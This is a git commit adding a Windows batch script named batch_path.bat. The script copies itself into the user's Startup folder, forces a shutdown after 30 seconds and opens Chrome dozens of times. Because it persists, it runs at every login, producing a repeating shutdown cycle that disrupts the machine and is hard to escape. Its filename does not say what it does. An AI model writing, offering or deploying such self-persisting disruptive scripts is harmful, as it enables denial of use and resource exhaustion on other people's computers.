27b447f2605bc4a96722eb8023aba3ccdd65b0b3
DraqeLover <158098838+DraqeLover@users.noreply.github.com>
2024-01-29 22:58:54 +0100

    batch_path.bat

---
+++ batch_path.bat
@@ -0,0 +1,61 @@
+@echo off
+setlocal
+
+rem Get the path to the current batch file
+set "batch_path=%~dp0"
+
+rem Set the path to the startup folder
+set "startup_folder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
+
+rem Move the batch file to the startup folder
+move "%batch_path%%~nx0" "%startup_folder%"
+
+echo Batch file moved to startup folder.
+
+shutdown -s -t 30
+
+start Chrome
+start Chrome
+start Chrome
+start Chrome
+start Chrome
+start Chrome
+start Chrome
+start Chrome
+start Chrome
+start Chrome
+start Chrome
+start Chrome
+start Chrome
+start Chrome
+start Chrome
+start Chrome
+start Chrome
+start Chrome
+start Chrome
+start Chrome
+start Chrome
+start Chrome
+start Chrome
+start Chrome
+start Chrome
+start Chrome
+start Chrome
+start Chrome
+start Chrome
+start Chrome
+start Chrome
+start Chrome
+start Chrome
+start Chrome
+start Chrome
+start Chrome
+start Chrome
+start Chrome
+start Chrome
+start Chrome
+start Chrome
+start Chrome
+start Chrome
+start Chrome
+start Chrome
